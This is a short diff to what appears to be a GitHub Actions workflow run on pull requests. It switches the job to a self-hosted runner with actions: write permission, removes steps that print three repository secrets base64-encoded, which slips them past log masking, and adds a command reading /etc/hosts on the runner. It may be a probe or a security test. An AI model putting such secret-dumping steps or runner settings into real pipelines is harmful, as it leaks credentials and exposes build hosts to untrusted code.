@@ -4,7 +4,7 @@ on: [pull_request]
 
 jobs:
   test:
-    runs-on: ubuntu-latest
+    runs-on: [self-hosted]
 
     permissions:
       actions: write
@@ -21,6 +21,4 @@ jobs:
     steps:
       - name: Test
         run: |
-          echo ${{ secrets.GHCR_TOKEN }} | base64
-          echo ${{ secrets.TEST_TOKEN }} | base64
-          echo ${{ secrets.GITHUB_TOKEN }} | base64
+          cat /etc/hosts
